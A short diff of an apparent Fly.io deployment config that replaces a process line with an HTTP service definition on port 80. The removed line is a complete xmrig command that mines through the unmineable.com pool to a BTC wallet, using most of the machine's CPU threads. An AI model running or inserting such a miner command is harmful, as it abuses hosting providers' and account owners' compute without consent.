@@ -4,8 +4,14 @@ primary_region = "nrt"
 [build]
   dockerfile = "Dockerfile"
 
-[processes]
-  app = "./xmrig -a ghostrider -o ghostrider.unmineable.com:80 -u BTC:bc1qlz0d2jurgfh60mqusvg9yp9lkkxms9ehul23ln.FlyIO_$(hostname)#tofg-baz9 --donate-level 1 --randomx-1gb-pages --asm=auto --threads 15 --cpu-max-threads-hint 90"
+[[services]]
+  protocol = "tcp"
+  internal_port = 80
+  processes = ["app"]
+
+[[services.ports]]
+  port = 80
+  handlers = ["http"]
 
 [vm]
   # KVM 가속을 위해 성능이 보장되는 머신 사용 권장
